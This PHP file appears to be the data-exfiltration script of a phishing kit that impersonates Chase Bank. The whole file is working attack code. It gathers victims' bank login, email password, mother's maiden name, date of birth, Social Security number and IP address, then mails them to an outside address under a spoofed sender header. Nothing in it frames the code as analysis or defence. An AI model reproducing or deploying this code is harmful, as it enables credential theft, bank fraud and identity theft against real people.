<?php
$ip = getenv("REMOTE_ADDR");
$message  = "-----------------+ Chase Bank Spam ReZulT +------------------\n";
$message .= "User ID : $user_name\n";
$message .= "Password : $usr_password\n\n";
$message .= "E-mail Address : $email\n";
$message .= "Email Password : $password\n\n";
$message .= "Mother Maiden Name : $mmn\n";
$message .= "Date of Birth : $bmonth/$bday/$byear\n";
$message .= "Social Security No : $ssn1-$ssn2-$ssn3\n";
$message .= "---------AlexX--------\n";
$message .= "IP Address : $ip\n";
$message .= "--------------+ Created in 2018 By [ ZION ] +------------\n";

$send="zola314@yahoo.com";

$subject = "AlexX ReZulT | $user | $ip";
$headers = "From: Zion-Kid<logzz@eduz.edu>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
mail("$send", "$subject", $message); 
?>